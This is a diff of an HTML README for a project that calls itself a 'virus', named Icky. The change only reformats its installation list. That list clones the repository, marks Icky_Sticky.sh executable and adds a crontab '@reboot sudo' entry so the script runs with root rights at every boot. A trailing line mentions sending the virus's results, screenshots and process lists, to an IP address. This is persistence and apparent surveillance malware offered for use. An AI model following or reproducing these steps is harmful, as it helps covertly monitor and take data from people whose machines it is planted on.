@@ -4,10 +4,10 @@
 This virus will have to be manually installed on the desired machine and will have to have sudo privileges.</p><br><br>
 <h3><strong><u> Installation: </u></strong></h3><br><br>
 <ul>
-  <li> 1. `git clone https://www.github.com/Domitius/Icky` </li>
-  <li> 2. `cd Icky` </li>
-  <li> 3. `chmod +x Icky_Sticky.sh` </li>
-  <li> 4. `crontab -e` and type `@reboot sudo /path/to/Icky_Sticky.sh` </li>
+  <li> 1. <b> git clone https://www.github.com/Domitius/Icky </b></li>
+  <li> 2. <b> cd Icky </b></li>
+  <li> 3. <b> chmod +x Icky_Sticky.sh </b></li>
+  <li> 4. <b> crontab -e and type <b> @reboot sudo /path/to/Icky_Sticky.sh </b></li>
 </ul>
 <br>
 <h4><b> If you want the results of the virus (screenshots and processs) sent to a IP <br>
